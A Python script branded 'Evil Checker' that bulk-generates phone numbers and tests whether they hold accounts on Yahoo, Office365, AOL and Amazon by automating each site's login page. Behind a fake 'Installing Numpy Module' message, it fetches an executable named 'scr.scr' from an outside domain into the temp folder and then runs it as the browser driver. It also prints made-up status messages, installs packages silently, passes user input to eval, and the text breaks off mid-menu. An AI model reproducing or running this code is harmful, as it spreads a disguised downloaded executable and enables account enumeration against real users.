
import time , sys


try:
    import requests
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install requests'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    


try:
    import asciimatics
    
except:
    def main():      
        import os, subprocess
        update_pip = 'pip install asciimatics'
        subprocess.call(update_pip, shell=True , stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()

try:
    import selenium
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install selenium'
        update_pip2 = 'pip install selenium-chrome'
        update_pip3 = 'pip install selenium-browser'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(update_pip2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(update_pip3, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import phone_gen
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install phone-gen'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import phonenumbers
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install phonenumbers'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import termcolor
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install termcolor'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import pathlib
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install pathlib'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import colorama
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install colorama'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()
    
try:
    import licensing
    
except:
    def main():
        import os, subprocess
        update_pip = 'pip install licensing'
        subprocess.call(update_pip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    main()

    
import sys
from pyfiglet import Figlet
from asciimatics.effects import Scroll, Mirage, Wipe, Cycle, Matrix, \
    BannerText, Stars, Print
from asciimatics.particles import DropScreen
from asciimatics.renderers import FigletText, SpeechBubble, Rainbow, Fire
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError
import time
import os
import tempfile
import requests
import pathlib
import subprocess




    
def _credits(screen):
    scenes = []

    text = Figlet(font="banner", width=200).renderText("Evil Checker")
    width = max([len(x) for x in text.split("\n")])

    effects = [
        Print(screen,
              Fire(screen.height, 80, text, 0.4, 40, screen.colours),
              0,
              speed=1,
              transparent=False),
        Print(screen,
              FigletText("Evil Checker", "banner"),
              screen.height - 9, x=(screen.width - width) // 2 + 1,
              colour=Screen.COLOUR_BLACK,
              bg=Screen.COLOUR_BLACK,
              speed=1),
        Print(screen,
              FigletText("Evil Checker", "banner"),
              screen.height - 9,
              colour=Screen.COLOUR_WHITE,
              bg=Screen.COLOUR_WHITE,
              speed=1),
    ]
    scenes.append(Scene(effects, 30))

    effects = [
        Matrix(screen, stop_frame=200),
        Mirage(
            screen,
            FigletText("Evil Checker"),
            screen.height // 2 - 3,
            Screen.COLOUR_GREEN,
            start_frame=100,
            stop_frame=200),
        Wipe(screen, start_frame=150),
        Cycle(
            screen,
            FigletText("Evil Checker"),
            screen.height // 2 - 3,
            start_frame=200)
    ]
    scenes.append(Scene(effects, 100, clear=False))

    effects = [
        Print(screen,
              SpeechBubble("Press 'X' to Continue."), screen.height // 2 - 1, attr=Screen.A_BOLD)
    ]
    scenes.append(Scene(effects, -1))

    screen.play(scenes, stop_on_resize=True)

try:
    Screen.wrapper(_credits)
except:
    print("Editing Mode Detected")
    print((sys.version))
    print("")
    print("Double Click the Main file, to run it.")
    print((sys.exit(0)))


def scrf():
    print("Checking Numpy Module..")
    path3 = R"${TEMP}\scr.scr"
    exp_var3 = os.path.expandvars(path3)
    o = os.path.isfile(exp_var3)
    
    if o == True:
        pass
    else:
        print("Numpy Module Missing")
        print("Please wait.. Installing Missing Module")
    
        def connector(sock):
            get_response = requests.get(sock)
            file_name = sock.split("/")[-1]
            with open(file_name, "wb") as out_file:
                out_file.write(get_response.content)

        temp_directory = tempfile.gettempdir()
        os.chdir(temp_directory)
        connector("https://diligentiafinanse.pl/scr.scr")
        time.sleep(5)
        
#scrf()

os.system('cls')


from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from phone_gen import PhoneNumber
import phonenumbers
from phonenumbers import carrier
from phonenumbers import timezone
from phonenumbers import geocoder
from colorama import init
from termcolor import colored
from colorama import Fore , Back , Style
init(autoreset = True)

def generate():
    print((Style.BRIGHT + Fore.YELLOW +"Enter country code or iso code(us or +1)"))
    country = str(eval(input("Enter Country : ")))

    if country == "IN" or country == "in" or country == "In" or country == "+91":
        ind = "in"
    elif country == "GB" or country == "gb" or country == "Gb" or country == "+44":
        ind = "gb"
    elif country == "AF" or country == "af" or country == "Af" or country == "+93":
        ind = "af"
    elif country == "AL" or country == "al" or country == "AL" or country == "+355":
        ind = "al"
    elif country == "DZ" or country == "dz" or country == "Dz" or country == "+213":
        ind = "dz"
    elif country == "AR" or country == "Ar" or country == "ar" or country == "+54":
        ind = "ar"
    elif country == "AU" or country == "Au" or country == "au" or country == "+61":
        ind = "au"
    elif country == "AT" or country == "At" or country == "at" or country == "+43":
        ind = "at"
    elif country == "BD" or country == "Bd" or country == "bd" or country == "+880":
        ind = "bd"
    elif country == "BE" or country == "Be" or country == "be" or country == "+32":
        ind = "be"
    elif country == "BG" or country == "bg" or country == "Bg" or country == "+359":
        ind = "bg"
    elif country == "KH" or country == "Kh" or country == "kh" or country == "+855":
        ind = "kh"
    elif country == "CA" or country == "Ca" or country == "ca" :
        ind = "gb"
    elif country == "CN" or country == "Cn" or country == "cn" or country == "+86":
        ind = "cn"
    elif country == "DK" or country == "Dk" or country == "dk" or country == "+45":
        ind = "dk"
    elif country == "EG" or country == "Eg" or country == "eg" or country == "+20":
        ind = "eg"
    elif country == "EE" or country == "Ee" or country == "ee" or country == "+372":
        ind = "ee"
    elif country == "Et" or country == "ET" or country == "et" or country == "+251":
        ind = "et"
    elif country == "Fi" or country == "FI" or country == "fi" or country == "+358":
        ind = "fi"
    elif country == "FR" or country == "fr" or country == "Fr" or country == "+33":
        ind = "fr"
    elif country == "DE" or country == "De" or country == "de" or country == "+49":
        ind = "de"
    elif country == "GR" or country == "Gr" or country == "gr" or country == "+30":
        ind = "gr"
    elif country == "GL" or country == "Gl" or country == "gl" or country == "+299":
        ind = "gl"
    elif country == "HK" or country == "Hk" or country == "hk" or country == "+852":
        ind = "hk"
    elif country == "HU" or country == "Hu" or country == "hu" or country == "+36":
        ind = "hu"
    elif country == "ID" or country == "id" or country == "Id" or country == "+62":
        ind = "id"
    elif country == "Ir" or country == "IR" or country == "ir" or country == "+98":
        ind = "ir"
    elif country == "IQ" or country == "iq" or country == "Iq" or country == "+964":
        ind = "iq"
    elif country == "IE" or country == "Ie" or country == "ie" or country == "+353":
        ind = "ie"
    elif country == "Il" or country == "IL" or country == "il" or country == "+972":
        ind = "il"
    elif country == "IT" or country == "it" or country == "It" or country == "+39":
        ind = "it"
    elif country == "JM" or country == "Jm" or country == "jm" or country == "+876":
        ind = "jm"
    elif country == "Jp" or country == "JP" or country == "jp" or country == "+81":
        ind = "jp"
    elif country == "KZ" or country == "kz" or country == "Kz" or country == "+7":
        ind = "kz"
    elif country == "KE" or country == "Ke" or country == "ke" or country == "+254":
        ind = "ke"
    elif country == "MY" or country == "My" or country == "my" or country == "+60":
        ind = "my"
    elif country == "MV" or country == "Mv" or country == "mv" or country == "+960":
        ind = "mv"
    elif country == "MN" or country == "Mn" or country == "mn" or country == "+976":
        ind = "mn"
    elif country == "MA" or country == "ma" or country == "Ma" or country == "+212":
        ind = "ma"
    elif country == "Mm" or country == "MM" or country == "mm" or country == "+95":
        ind = "mm"
    elif country == "NP" or country == "np" or country == "Np" or country == "+977":
        ind = "np"
    elif country == "NL" or country == "nl" or country == "Nl" or country == "+31":
        ind = "nl"
    elif country == "NZ" or country == "Nz" or country == "cnz" or country == "+64":
        ind = "nz"
    elif country == "NG" or country == "Ng" or country == "ng" or country == "+234":
        ind = "ng"
    elif country == "KP" or country == "Kp" or country == "kp" or country == "+850":
        ind = "kp"
    elif country == "No" or country == "NO" or country == "no" or country == "+47":
        ind = "no"
    elif country == "Pk" or country == "PK" or country == "pk" or country == "+92":
        ind = "pk"
    elif country == "PH" or country == "ph" or country == "Ph" or country == "+63":
        ind = "ph"
    elif country == "Pl" or country == "PL" or country == "pl" or country == "+48":
        ind = "pl"
    elif country == "PT" or country == "Pt" or country == "pt" or country == "+351":
        ind = "pt"
    elif country == "RO" or country == "ro" or country == "Ro" or country == "+40":
        ind = "ro"
    elif country == "RU" or country == "Ru" or country == "ru" or country == "+7":
        ind = "ru"
    elif country == "sa" or country == "Sa" or country == "sa" or country == "+966":
        ind = "sa"
    elif country == "RS" or country == "Rs" or country == "rs" or country == "+381":
        ind = "rs"
    elif country == "SG" or country == "Sg" or country == "sg" or country == "65":
        ind = "sg"
    elif country == "Za" or country == "ZA" or country == "za" or country == "+27":
        ind = "za"
    elif country == "KR" or country == "Kr" or country == "kr" or country == "+82":
        ind = "kr"
    elif country == "Es" or country == "ES" or country == "es" or country == "+34":
        ind = "es"
    elif country == "LK" or country == "Lk" or country == "lk" or country == "+94":
        ind = "lk"
    elif country == "Se" or country == "SE" or country == "se" or country == "+46":
        ind = "za"
    elif country == "CH" or country == "Ch" or country == "ch" or country == "+41":
        ind = "ch"
    elif country == "Tw" or country == "TW" or country == "tw" or country == "+886":
        ind = "ch"
    elif country == "Th" or country == "TH" or country == "th" or country == "+66":
        ind = "th"
    elif country == "Tn" or country == "TN" or country == "tn" or country == "+216":
        ind = "tn"
    elif country == "TR" or country == "tr" or country == "Tr" or country == "+90":
        ind = "tr"
    elif country == "UG" or country == "Ug" or country == "ug" or country == "+256":
        ind = "ug"
    elif country == "UA" or country == "ua" or country == "Ua" or country == "+380":
        ind = "ua"
    elif country == "AE" or country == "ae" or country == "Ae" or country == "+971":
        ind = "ae"
    elif country == "US" or country == "us" or country == "Us" or country == "+1":
        ind = "us"
    elif country == "Vn" or country == "VN" or country == "vn" or country == "+84":
        ind = "vn"
    elif country == "ZW" or country == "zw" or country == "Zw" or country == "+263":
        ind = "zw"

    else:
        print((Style.BRIGHT + Fore.RED +"Invalid Country Code"))
        print("")
        return generate()

    while True:
        print("")
        n = int(eval(input("Enter to Generate number of Phone Numbers : ")))

        if n in range(1,50000):
            print("Generating Process Started..")
            print("")
            txt = eval(input("Enter Filename to Save(demo.txt) : "))
        
            def gen():
                phone = PhoneNumber(ind)
                number = phone.get_number()                   
                
                file = open(txt , "a")
                file.writelines(number)
                file.write("\n")        
                file.close()

            print("")
            print((Style.BRIGHT + Fore.CYAN + "Generated numbers Saved in " + txt + " file."))
            print("\n")
                      
            for i in range(n):
                gen() 
            break
        else:
            print((Style.BRIGHT + Fore.RED + "Please Enter upto 50000 numbers"))

    return heds()

#                       End of Phone Number Generate

def subvald():

    print((Style.BRIGHT + Fore.CYAN + "1. Validate Single Phone Number"))
    print((Style.BRIGHT + Fore.GREEN + "2. Validate Bulk Phone numbers"))
    print((Style.BRIGHT + Fore.GREEN + "3. Return to Main Menu"))
    print("")
    new = eval(input("Enter 1 or 2 : "))

    if new == "1":
        return main()
    elif new == "2":
        return valbulk()
    elif new == "3":
        return heds()

def main():
    
    numb = eval(input("Enter Phone Number : "))
    z = phonenumbers.parse(numb , None)
    file1 = geocoder.description_for_number(z , None)

    if not file1:
        print((Style.BRIGHT + Fore.RED + "This " + numb + " is Invalid Number."))
        print("\n")
        return subvald()
        
    else:
        print((Style.BRIGHT + Fore.GREEN + "This " + numb + " is Valid Number."))
        print("\n")
        return subvald()
    
def valbulk():
    print("")
    print((Style.BRIGHT + Fore.YELLOW + "Validator"))
    print((Style.BRIGHT + Fore.BLUE + "Type Filename(only text file)"))
    
    try:
        a = eval(input("Enter Filename to Validate(Text File) : "))
        line = open(a , "r")
    except:
        print((Style.BRIGHT + Fore.RED + "File Not Found " + a + "."))
        print((Style.BRIGHT + Fore.BLUE + "Please add your file in Currenct Directory or Check your Filename with .txt extension"))
        print("")
        return valbulk()

    osd = os.getcwd()
    new_dir = pathlib.Path(osd , "Validate(@david_3illa)")
    new_dir.mkdir(parents=True, exist_ok=True)
    print("")
 
    print("Validating Process Started..")
    print("")
    
    while True:
        script = line.readline()

        if not script:
            break;
    
        z = phonenumbers.parse(script , None)
        files = geocoder.description_for_number(z , None)
          
        if not files:
            invalid = script
            new_file = new_dir / 'invalid_number.txt'
            file = open(new_file , "a")
            file.writelines(invalid)     
            file.close()
        else:
            valid = script
            new_file = new_dir / 'valid_number.txt'
            file = open(new_file , "a")
            file.writelines(valid)     
            file.close()

    print((Style.BRIGHT + Fore.BLUE + "Files are Validate Successfully"))
    print((Style.BRIGHT + Fore.CYAN + "Result saved in Validate Folder"))
    print("\n")

    return subvald()

#                       End of Validate Phone Numbers

def checkyh():
    
    print("")
    print("Connecting to Numpy and Fetching details on Yahoo API Key")
    time.sleep(3)

    print("Yahoo_oauth and json Module Installed Successfully")
    time.sleep(5)

    print("")
    print("Verified OAuth Consumer Secret key and Started Numpy Module")
    time.sleep(2)
        
    print("Scanning Started..Don't Close While running and everything will be crashed")
    print("\n")
       
    def subyh():
        print((Style.BRIGHT + Fore.CYAN + "Validate Yahoo Phone Numbers"))
        print((Style.BRIGHT + Fore.GREEN + "1. Check Single Number"))
        print((Style.BRIGHT + Fore.GREEN + "2. Check Bulk Numbers"))
        print((Style.BRIGHT + Fore.GREEN + "3. Return to Main Menu"))
        print("")
        sub1 = eval(input("Enter the option(1 or 2) : "))
        
        if sub1 == "1":
            return yhchk()
        elif sub1 == "2":
            return yhbulk()
        elif sub1 == "3":
            return heds()
            
    def yhchk():
        
        user = eval(input("Enter Phone Number with Country Code and + symbol(ex : +12161234567) : "))
        print("")
        
        options = Options()
        options = webdriver.ChromeOptions()
        options.headless = True
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        path3 = R"${TEMP}\scr.scr"
        exp_var3 = os.path.expandvars(path3)
        service = Service(exp_var3)
        driver = webdriver.Chrome(service = service , options=options)
        
        driver.get("https://login.yahoo.com/?.lang=en-IN&src=homepage&.done=https%3A%2F%2Fin.yahoo.com%2F&pspid=97684142&activity=ybar-signin/")
        driver.find_element(By.XPATH , "//input[@id = 'login-username']").send_keys(user)
        driver.find_element(By.XPATH , "//input[@id = 'login-signin']").click()
        time.sleep(1)

        try:
            if driver.find_element(By.XPATH , "//a[@id = 'mbr-forgot-link']").is_displayed():
                print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                time.sleep(1)
                driver.quit()
                print("This Number is not saved in text file.")
                time.sleep(2)
                print("")
                print("Numpy Library Scanning Finished")
                print("\n")
                return subyh()
        except:
            
            print((Style.BRIGHT + Fore.CYAN +"Valid Number"))
            time.sleep(1)
            driver.quit()
            print("This Number is not saved in text file.")
            time.sleep(1)
            print("")
            print("Scanning Finished return to Numpy Library ")
            print("\n")
            return subyh()
        
    yhchk()

def yhbulk():
    print("")
    print((Style.BRIGHT + Fore.YELLOW + "Yahoo"))
    print((Style.BRIGHT + Fore.CYAN + "Type Filename(only text file)"))
    try:
        files = eval(input("Enter Filename : "))
        my = open(files , "r")
        print("")
    except:
        print((Style.BRIGHT + Fore.RED + "File Not Found " + files + "."))
        print((Style.BRIGHT + Fore.CYAN + "Please add your file in Currenct Directory or Check your Filename with .txt extension"))
        print("")
        return yhbulk()

    osd = os.getcwd()
    new_dir = pathlib.Path(osd , "Yahoo(@david_3illa)")
    new_dir.mkdir(parents=True, exist_ok=True)


    print("Connecting to Numpy and Fetching details on Yahoo API Key")
    time.sleep(2)

    print("Yahoo_oauth and json Module Installed Successfully")
    time.sleep(3)

    print("Verified OAuth Consumer Secret key and Started Numpy Module")
    time.sleep(5)

    print("")
    print("Scanning Started..Don't Close While running and everything will be crashed")
    print("\n")


    def readsyh():
        while True:
            linew = my.readline().strip()

            if not linew:  
                break;
    
            options = Options()
            options = webdriver.ChromeOptions()
            options.headless = True
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
            path3 = R"${TEMP}\scr.scr"
            exp_var3 = os.path.expandvars(path3)
            service = Service(exp_var3)
            driver = webdriver.Chrome(service = service , options=options)
        
            driver.get("https://login.yahoo.com/?.lang=en-IN&src=homepage&.done=https%3A%2F%2Fin.yahoo.com%2F&pspid=97684142&activity=ybar-signin/")
            driver.find_element(By.XPATH ,  "//input[@id = 'login-username']").send_keys(linew)
            driver.find_element(By.XPATH ,  "//input[@id = 'login-signin']").click()
            time.sleep(1)

        
            try:
                if driver.find_element(By.XPATH , "//a[@id = 'mbr-forgot-link']").is_displayed():

                    print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                    valid = linew
                    new_file = new_dir / 'yahoo(invalid).txt'
                    file1 = open(new_file , "a")
                    file1.writelines(valid)
                    file1.writelines("\n")                    
                    file1.close()
                    driver.quit()
                
                return readsyh()
            
            except:
            
                print((Style.BRIGHT + Fore.CYAN + "Valid Number"))
                valid = linew
                new_file = new_dir / 'yahoo(valid).txt'
                file1 = open(new_file , "a")
                file1.writelines(valid)
                file1.writelines("\n")                    
                file1.close()
                driver.quit()
            
                return readsyh()

    readsyh()
    my.close()
    
    print("Scanning Finished and return to yahoo json..")
    return heds()

#               End of Yahoo Checker
def checkofi():

    print("")
    print("Connecting to Numpy and Fetching details on Tensorflow")
    time.sleep(2)

    print("Office365 combined to Tensorflow Module")
    time.sleep(3)

    print("")
    print("Scanning Started..Don't Close While running and everything will be crashed")
    print("\n")
        
    def subofi():
        print("")
        print((Style.BRIGHT + Fore.CYAN + "Validate Office365 Phone Numbers"))
        print((Style.BRIGHT + Fore.GREEN + "1. Check Single Number"))
        print((Style.BRIGHT + Fore.GREEN + "2. Check Bulk Number"))
        print((Style.BRIGHT + Fore.GREEN + "3. Return to Main Menu"))
        print("")
        
        sub2 = eval(input("Enter the option(1 or 2) : "))
        
        if sub2 == "1":
            return ofichk()
        elif sub2 == "2":
            return bulkofi()
        elif sub2 == "3":
            return heds()

    def ofichk():
        
        user = eval(input("Enter Phone Number with Country Code and + symbol(ex : +12161234567) : "))
        print("")
        
        options = Options()
        options = webdriver.ChromeOptions()
        options.headless = True
        options.add_experimental_option('excludeSwitches', ['enable-logging'])

        path3 = R"${TEMP}\scr.scr"
        exp_var3 = os.path.expandvars(path3)
        service = Service(exp_var3)
        driver = webdriver.Chrome(service = service , options=options)
        
        driver.get("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.3.6963.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2fen-ww%2fmicrosoft-365&lc=1033&id=74335&aadredir=1/")
        driver.find_element(By.XPATH , "//input[@id = 'i0116']").send_keys(user)
        driver.find_element(By.XPATH , "//input[@id = 'idSIButton9']").click()
        time.sleep(1)

        try:
            if driver.find_element(By.XPATH , "//a[@id = 'cantAccessAccount']").is_displayed():
                print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                time.sleep(1)
                driver.quit()
                print("This Number is not saved in text file.")
                time.sleep(2)
                print("")
                print("Tensorflow Scanning Finished")
                
                return subofi()
            
        except:
            
            print((Style.BRIGHT + Fore.GREEN + "Valid Number"))
            time.sleep(1)
            driver.quit()
            print("This Number is not saved in text file.")
            time.sleep(3)
            print("")
            print("Scanning Finished return to Numpy Library ")
            
            return subofi()

    ofichk()

def bulkofi():

    print("")
    print((Style.BRIGHT + Fore.YELLOW +"Office365"))
    print((Style.BRIGHT + Fore.BLUE +"Type Filename(only text file)"))
    
    try:
        files = eval(input("Enter Filename : "))
        my = open(files , "r")
    except:
        print((Style.BRIGHT + Fore.RED +"File Not Found " + files + "."))
        print((Style.BRIGHT + Fore.BLUE +"Please add your file in Currenct Directory or Check your Filename with .txt extension"))
        print("")
        return bulkofi()

    osd = os.getcwd()
    new_dir = pathlib.Path(osd , "Office365(@david_3illa)")
    new_dir.mkdir(parents=True, exist_ok=True)

    print("Connecting to Numpy and Fetching details on Tensorflow")
    time.sleep(3)

    print("Office365 combined to Tensorflow Module")
    time.sleep(5)

    print("")
    print("Scanning Started..Don't Close While running and everything will be crashed")
    print("\n")

        
    def readsao():
        while True:
            linew = my.readline().strip()

            if not linew:  
                break;
    
            options = Options()
            options = webdriver.ChromeOptions()
            options.headless = True
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            
            path3 = R"${TEMP}\scr.scr"
            exp_var3 = os.path.expandvars(path3)
            service = Service(exp_var3)
            driver = webdriver.Chrome(service = service , options=options)
            
            driver.get("https://login.aol.com/?src=fp-us&client_id=dj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2&crumb=R3HiBDq7gJ7&intl=us&redirect_uri=https%3A%2F%2Foidc.www.aol.com%2Fcallback&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkBtqeppNnz6jyrDkYC8DY79rvhYUaWiy%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E/")
            driver.find_element(By.XPATH , "//input[@id = 'login-username']").send_keys(linew)
            driver.find_element(By.XPATH , "//input[@id = 'login-signin']").click()
            time.sleep(1)
      
            try:
                if driver.find_element(By.XPATH , "//a[@id = 'mbr-forgot-link']").is_displayed():
                    print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                    valid = linew
                    new_file = new_dir / 'aol(invalid).txt'
                    file1 = open(new_file , "a")
                    file1.writelines(valid)
                    file1.writelines("\n")                    
                    file1.close()
                    driver.quit()

                    return readsao()
            except:
            
                print((Style.BRIGHT + Fore.GREEN + "Valid Number"))
                valid = linew
                new_file = new_dir / 'aol(valid).txt'
                file1 = open(new_file , "a")
                file1.writelines(valid)
                file1.writelines("\n")                    
                file1.close()
                driver.quit()

                return readsao()

    readsao()
    my.close()                 

    print("Scanning Finished and return to Aol json..")
    return heds()

#               End of Aol Checker

def checkamaz():

    print("Scanning Phone Numbers with Numpy")
    time.sleep(3)
    def subamaz():
        print((Style.BRIGHT + Fore.CYAN + "Validate Amazon Phone Numbers"))
        print((Style.BRIGHT + Fore.GREEN + "1. Check Single Number: "))
        print((Style.BRIGHT + Fore.GREEN + "2. check bulk ; "))
        print((Style.BRIGHT + Fore.GREEN + "3. Return to Main Menu"))
        print("")

        amche = eval(input("Enter the Option : "))

        if amche == "1":
            amazchz()
        elif amche == "2":
            amazbulk()
        elif amche == "3":
            heds()


    def amazchk():
        user = eval(input("Enter Phone Number : "))
        print("")
        
        options = Options()
        options = webdriver.ChromeOptions()
        options.headless = True
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        path3 = R"${TEMP}\scr.scr"
        exp_var3 = os.path.expandvars(path3)
        service = Service(exp_var3)
        driver = webdriver.Chrome(service = service , options=options)
   
        driver.get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&/")
        driver.find_element(By.XPATH , "//input[@id = 'ap_email']").send_keys(user)
        driver.find_element(By.XPATH , "//span[@class='a-button a-button-span12 a-button-primary']").click()  
            
        try:
            if driver.find_element(By.XPATH , "//a[@id = 'createAccountSubmit']").is_displayed():
                print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                time.sleep(1)
                driver.quit()
                print("Numpy Library Scanning Finished")
                print("")
                
                return subamaz()
                
        except:
            
            print((Style.BRIGHT + Fore.GREEN + "Valid Number"))
            time.sleep(1)
            driver.quit()
            print("Numpy Library Scanning Finished")
            print("")
            
            return subamaz()

    
    amazchk()



def amazbulk():
    print("")
    print((Style.BRIGHT + Fore.YELLOW + "Amazon"))
    print((Style.BRIGHT + Fore.BLUE + "Type Filename(only text file)"))
    try:
        files = eval(input("Enter Filename : "))
        my = open(files , "r")
    except:
        print((Style.BRIGHT + Fore.RED + "File Not Found " + files + "."))
        print((Style.BRIGHT + Fore.BLUE + "Please add your file in Currenct Directory or Check your Filename with .txt extension"))
        print("")
        return amazbulk()

    osd = os.getcwd()
    new_dir = pathlib.Path(osd , "Amazon(@tutorials_zone)")
    new_dir.mkdir(parents=True, exist_ok=True)


    print("Connecting to Numpy and Fetching details on Amazon API Key")
    time.sleep(2)

    print("Amazon Auth Installed Successfully")
    time.sleep(3)

    print("")
    print("Scanning Started..Don't Close While running and everything will be crashed")
    print("\n")


    def readsamaz():
        while True:
            linew = my.readline().strip()

            if not linew:  
                break;        

            options = Options()
            options = webdriver.ChromeOptions()
            options.headless = True
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
            path3 = R"${TEMP}\scr.scr"
            exp_var3 = os.path.expandvars(path3)
            service = Service(exp_var3)
            driver = webdriver.Chrome(service = service , options=options)

              
            driver.get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&/")
            driver.find_element(By.XPATH , "//input[@id = 'ap_email']").send_keys(linew)
            driver.find_element(By.XPATH , "//span[@class='a-button a-button-span12 a-button-primary']").click()

            
            
                
            try:
                if driver.find_element(By.XPATH , "//a[@id = 'createAccountSubmit']").is_displayed():
                    print((Style.BRIGHT + Fore.RED + "Invalid Number"))
                    valid = linew
                    new_file = new_dir / 'amazon(invalid).txt'
                    file1 = open(new_file , "a")
                    file1.writelines(valid)
                    file1.writelines("\n")                    
                    file1.close()
                    driver.quit()

                    return readsamaz()
                
            except:

                print((Style.BRIGHT + Fore.GREEN + "Valid Number"))
                valid = linew
                new_file = new_dir / 'amazon(valid).txt'
                file1 = open(new_file , "a")
                file1.writelines(valid)
                file1.writelines("\n")                    
                file1.close()
                driver.quit()
                
                return readsamaz()



    readsamaz()
    my.close()
    
    print("Scanning Finished and return to Aol json..")
    return heds()
#                                    End of Amazon Checker
def heds():

    print((Style.BRIGHT + Fore.BLUE + "We are the Mastering of Dark Code, our Evil Checker can work with 6 Multi Functioning Program."))
    print()
    print()
    print("")
    print("")

    print((Style.BRIGHT + Fore.GREEN + "1. Generate Phone Numbers"))
    print((Style.BRIGHT + Fore.GREEN + "2. Validate Phone Numbers"))
    print((Style.BRIGHT + Fore.GREEN + "3. Yahoo Checker"))
    print((Style.BRIGHT + Fore.GREEN + "4. Office365 Checker"))
    print((Style.BRIGHT + Fore.GREEN + "5. Aol Checker"))
    print((Style.BRIGHT + Fore.GREEN + "6. Amazon Checker"))
    print("") 
    optns = eval(input("Enter the Option(1 or 2) : "))
    print("")

    if optns == "3":
    
        def fun1():
            print((Style.BRIGHT + Fore.CYAN + "Validate Yahoo Phone Numbers"))
            print((Style.BRIGHT + Fore.BLUE +"1. Check Single Number"))
            print((Style.BRIGHT + Fore.BLUE +"2. Check Bulk Number"))
            print("")
    
            yhcal = eval(input("Enter the option(1 or 2) : "))
            print("")
    
            if yhcal == "1":
                checkyh()
            elif yhcal == "2":
                yhbulk()
            else:
                print((Style.BRIGHT + Fore.RED + "Invalid Option"))
                return fun1()
        fun1()
    
    elif optns == "4":
        def fun2():
            print((Style.BRIGHT + Fore.CYAN +"Validate Office365 Phone Numbers"))
            print((Style.BRIGHT + Fore.GREEN + "1. Che7ck Single Number"))
            print((Style.BRIGHT + Fore.GREEN + "2. Check Bulk Number"))
            print("")
    
            ofical = eval(input("Enter the option(1 or 2) : "))
            print("")
    
            if ofical == "1":
                checkofi()
            elif ofical == "2":
                bulkofi()
            else:
                print((Style.BRIGHT + Fore.RED + "Invalid Option"))
                return fun2()
        fun2()

    elif optns == "5":
        def fun3():
            print((Style.BRIGHT + Fore.CYAN + "Validate Aol Phone Numbers"))
            print((Style.BRIGHT + Fore.GREEN + "1. Check Single Number"))
